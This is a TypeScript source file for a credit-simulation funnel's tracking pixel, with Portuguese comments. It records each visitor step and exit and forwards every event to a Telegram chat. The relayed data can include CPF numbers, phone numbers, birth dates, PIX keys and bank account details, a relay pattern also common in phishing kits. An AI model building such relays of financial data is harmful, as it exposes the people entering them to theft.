import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { sendTelegramNotification } from "./telegram-notifier";
import type { FunnelStep, LeadMetadata } from "./tracker-core";

const trackingPayloadSchema = z.object({
  leadId: z.string(),
  cpf: z.string().optional(),
  name: z.string().optional(),
  phone: z.string().optional(),
  birthDate: z.string().optional(),
  profile: z.string().optional(),
  reason: z.string().optional(),
  duration: z.string().optional(),
  range: z.string().optional(),
  calculatedScore: z.number().optional(),
  approvedAmount: z.number().optional(),
  payoutMethod: z.string().optional(),
  pixType: z.string().optional(),
  pixKey: z.string().optional(),
  bankName: z.string().optional(),
  agency: z.string().optional(),
  account: z.string().optional(),
  otherBanks: z.array(z.string()).optional(),
  answers: z.record(z.string(), z.string()).optional(),
  timeOnSiteSeconds: z.number().optional(),
  deviceType: z.string().optional(),
  origin: z.string().optional(),
  step: z.string(),
  stepDetails: z.string().optional(),
  honeypotFilled: z.boolean().optional(),
});

// Server Function para receber eventos do Pixel e repassar ao Telegram
export const dispatchPixelEvent = createServerFn({ method: "POST" })
  .validator((d: LeadMetadata) => trackingPayloadSchema.parse(d))
  .handler(async ({ data }) => {
    try {
      // Atualiza métricas reais do sistema
      const { recordVisit, recordAbandon, recordConversion, recordSimulation, recordProposal } = await import("./system-metrics");
      if (data.step === "visit") recordVisit();
      else if (data.step === "page_exit") {
        const exitStep = data.stepDetails?.replace("Parou na etapa: ", "") || "inicio";
        recordAbandon(exitStep);
      }
      else if (data.step === "cpf_entered" || data.step === "cpf_validated") recordSimulation();
      else if (data.step === "valor_viewed" || data.step === "review_accepted") {
        if (data.approvedAmount) recordProposal(data.approvedAmount);
      } else if (data.step === "whatsapp_clicked") {
        recordConversion(data.approvedAmount);
      }

      await sendTelegramNotification(data as LeadMetadata);
      return { success: true };
    } catch (e) {
      console.error("[Pixel Dispatcher] Erro ao processar evento:", e);
      return { success: false };
    }
  });

// Pixel do Lado do Cliente (Browser)
class ClientPixel {
  private leadId: string = "";
  private startTime: number = Date.now();
  private leadState: Partial<LeadMetadata> = {};
  private lastTrackedStep: string = "";

  constructor() {
    if (typeof window !== "undefined") {
      this.init();
    }
  }

  private init() {
    const existing = localStorage.getItem("agi_lead_id");
    if (existing) {
      this.leadId = existing;
    } else {
      this.leadId = "LEAD_" + Math.random().toString(36).substring(2, 9).toUpperCase() + "_" + Date.now().toString(36).toUpperCase();
      localStorage.setItem("agi_lead_id", this.leadId);
    }

    const savedState = localStorage.getItem("agi_lead_state");
    if (savedState) {
      try {
        this.leadState = JSON.parse(savedState);
      } catch {
        this.leadState = {};
      }
    }

    this.setupExitListener();
  }

  private setupExitListener() {
    window.addEventListener("beforeunload", () => {
      if (this.leadState.step && this.leadState.step !== "whatsapp_clicked") {
        this.track("page_exit", {
          stepDetails: `Parou na etapa: ${this.leadState.step}`,
        });
      }
    });
  }

  public updateData(partial: Partial<LeadMetadata>) {
    this.leadState = { ...this.leadState, ...partial };
    if (typeof window !== "undefined") {
      localStorage.setItem("agi_lead_state", JSON.stringify(this.leadState));
    }
  }

  public getLeadState(): Partial<LeadMetadata> {
    return { ...this.leadState };
  }

  public getLeadId(): string {
    return this.leadId;
  }

  public async track(step: FunnelStep, extra?: Partial<LeadMetadata>) {
    // Evita disparar repetido a mesma etapa em loop
    if (this.lastTrackedStep === step && !extra?.stepDetails) return;
    this.lastTrackedStep = step;

    if (extra) {
      this.updateData(extra);
    }

    const timeOnSite = Math.round((Date.now() - this.startTime) / 1000);
    const isMobile = typeof navigator !== "undefined" && /Mobi|Android|iPhone/i.test(navigator.userAgent);

    const payload: LeadMetadata = {
      ...this.leadState,
      leadId: this.leadId,
      step,
      timeOnSiteSeconds: timeOnSite,
      deviceType: isMobile ? "Celular (Mobile)" : "Computador (Desktop)",
      origin: typeof window !== "undefined" ? window.location.href : "",
      ...extra,
    };

    try {
      // Dispara assíncrono para o backend sem bloquear a interface do usuário
      await dispatchPixelEvent({ data: payload });
    } catch {
      // Falha silenciosa para nunca quebrar a experiência do usuário
    }
  }
}

export const pixel = new ClientPixel();
